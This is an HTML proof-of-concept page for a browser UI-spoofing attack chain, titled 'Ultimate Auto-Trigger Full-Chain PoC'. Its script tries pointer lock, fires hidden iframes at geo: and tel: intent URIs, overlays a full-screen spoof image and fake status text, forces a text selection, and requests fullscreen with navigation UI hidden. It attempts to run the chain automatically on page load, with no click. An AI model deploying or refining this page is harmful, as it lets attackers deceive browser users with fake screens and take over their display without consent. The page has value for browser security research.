<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
    <title>Ultimate Auto-Trigger Full-Chain PoC</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100vh;
        height: 100dvh;
        width: 100vw;
        background: #0b0e14;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        color: #f0f6fc;
        display: flex;
        align-items: center;
        justify-content: center;
        overflow: hidden;
        position: fixed;
      }
      #fullscreenElement {
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        height: 100dvh;
        display: flex;
        align-items: center;
        justify-content: center;
        box-sizing: border-box;
      }
      .container { text-align: center; max-width: 650px; padding: 20px; box-sizing: border-box; z-index: 10; }
      button {
        width: 100%;
        max-width: 360px;
        padding: 18px 24px;
        font-size: 16px;
        font-weight: 600;
        background: #da3633;
        color: #fff;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
        transition: transform 0.1s, background 0.2s;
      }
      button:active { background: #b62324; transform: scale(0.98); }
      .info {
        margin-top: 20px;
        font-size: 13px;
        color: #8b949e;
        font-family: monospace;
        word-break: break-all;
        padding: 0 10px;
        user-select: text;
      }
      #spoof {
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        height: 100dvh;
        object-fit: cover;
        z-index: 2147483647;
        pointer-events: none;
        display: none;
      }
      #pointerLockElement {
        width: 1px;
        height: 1px;
        position: absolute;
        opacity: 0;
      }
      #fullscreenFakeCursor {
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        height: 100dvh;
        background: rgba(11, 14, 20, 0.98);
        border: 4px solid #3fb950;
        box-sizing: border-box;
        z-index: 2147483648;
        display: none;
        pointer-events: none;
        align-items: center;
        justify-content: center;
        font-family: monospace;
        color: #3fb950;
        font-size: 14px;
        text-align: center;
        padding: 20px;
      }
      #selectionOverlapLayer {
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        height: 100dvh;
        background: rgba(11, 14, 20, 0.9);
        z-index: 2147483646;
        display: none;
        align-items: center;
        justify-content: center;
        flex-direction: column;
        user-select: text;
        -webkit-user-select: text;
        padding: 20px;
        box-sizing: border-box;
      }
      .overlap-text {
        font-size: 14px;
        color: #3fb950;
        font-family: monospace;
        background: #161b22;
        border: 1px solid #30363d;
        padding: 15px;
        border-radius: 8px;
        max-width: 500px;
        width: 100%;
        text-align: left;
        box-shadow: 0 8px 24px rgba(0,0,0,0.5);
      }
    </style>
    <script>
      addEventListener("touchstart", (e) => {
        let cursor = document.getElementById("fullscreenFakeCursor");
        if (cursor) {
          cursor.style.display = "flex";
        }
        let input = document.getElementById("focusInput");
        if (input) input.focus();
      }, { passive: true });

      addEventListener("touchend", (e) => {
        let input = document.getElementById("focusInput");
        if (input) input.blur();
      }, { passive: true });
    </script>
  </head>
  <body>
    <div id="fullscreenFakeCursor">
      <div>
        [AUTO_TRIGGER_CHAIN_ACTIVE]<br><br>
        Attempting zero-click matrix execution.<br>
        Status: Awaiting user context activation.
      </div>
    </div>

    <input id="focusInput" style="width: 0px; height: 0px; border: none; outline: none; background: transparent; position: absolute; opacity: 0;" />

    <div id="pointerLockElement"></div>

    <div id="fullscreenElement">
      <img id="spoof" src="spoof.png" alt="Spoof Layer">

      <div id="selectionOverlapLayer">
        <div class="overlap-text" id="overlapContent">
          [SECURE_CONTEXT_OVERLAP_ACTIVE]<br>
          Target DOM Selection Overlap initialized successfully.<br>
          Status: Forcing context focus and auto-trigger binding...
        </div>
      </div>

      <div class="container" id="mainContainer">
        <button id="execBtn">INITIALIZE AUTO-TRIGGER CHAIN</button>
        <div class="info" id="statusInfo">Status: Ready for auto-execution attempt.</div>
      </div>
    </div>

    <script>
      let execButton = document.getElementById("execBtn");
      let statusInfo = document.getElementById("statusInfo");

      async function runChainSequence() {
        statusInfo.innerText = "Status: Executing automated full-chain sequence...";
        execButton.style.display = "none";

        try {
          // 1. Pointer Lock Integration
          let plElement = document.getElementById("pointerLockElement");
          if (plElement && plElement.requestPointerLock) {
            await plElement.requestPointerLock().catch((err) => {
              console.debug("PointerLock restricted/denied:", err.message);
            });
          }

          // 2. Multi-Protocol Intent URI Dispatcher Chaining
          let protocols = ["geo:0,0?q=apple.com", "tel:+123456789"];
          protocols.forEach((proto, index) => {
            setTimeout(() => {
              let frame = document.createElement("iframe");
              frame.style.display = "none";
              frame.src = proto;
              document.body.appendChild(frame);
            }, index * 100);
          });

          // 3. Mengaktifkan Fullscreen Fake Cursor & Selection Overlap Layer
          let fullCursor = document.getElementById("fullscreenFakeCursor");
          if (fullCursor) {
            fullCursor.style.display = "flex";
          }

          let overlapLayer = document.getElementById("selectionOverlapLayer");
          if (overlapLayer) {
            overlapLayer.style.display = "flex";
            let overlapContent = document.getElementById("overlapContent");
            if (overlapContent && window.getSelection) {
              let range = document.createRange();
              range.selectNodeContents(overlapContent);
              let selection = window.getSelection();
              selection.removeAllRanges();
              selection.addRange(range);
            }
          }

          // 4. Deployment Visual Spoof Layer
          let spoofImg = document.getElementById("spoof");
          if (spoofImg) {
            spoofImg.style.display = "block";
          }

          statusInfo.innerText = "Status: Vectors dispatched. Forcing Fullscreen lock...";

          // 5. Aggressive Fullscreen Chaining
          setTimeout(async () => {
            let fsElement = document.getElementById("fullscreenElement") || document.documentElement;
            
            let requestFS = fsElement.requestFullscreen || 
                            fsElement.webkitRequestFullscreen || 
                            fsElement.mozRequestFullScreen || 
                            fsElement.msRequestFullscreen;

            if (requestFS) {
              try {
                await requestFS.call(fsElement, { navigationUI: "hide" });
              } catch (err) {
                try {
                  await requestFS.call(fsElement);
                } catch (e) {
                  console.debug("Fullscreen restriction notice:", e.message);
                }
              }
            }

            let container = document.getElementById("mainContainer");
            if (container) {
              container.style.display = "none";
            }
            
            statusInfo.innerText = "Status: Auto-trigger chain sequence completed.";
          }, 250);

        } catch (err) {
          statusInfo.innerText = "Status: Execution error: " + err.message;
          execButton.style.display = "block";
        }
      }

      // Event listener manual pada tombol
      execButton.onclick = runChainSequence;

      // Percobaan 0-Click Auto-Trigger saat dokumen selesai dimuat
      window.addEventListener("DOMContentLoaded", () => {
        setTimeout(() => {
          // Memanggil fungsi secara otomatis tanpa menunggu klik manual (akan dibatasi oleh kebijakan browser jika tanpa gestur)
          runChainSequence();
        }, 500);
      });
    </script>
  </body>
</html>
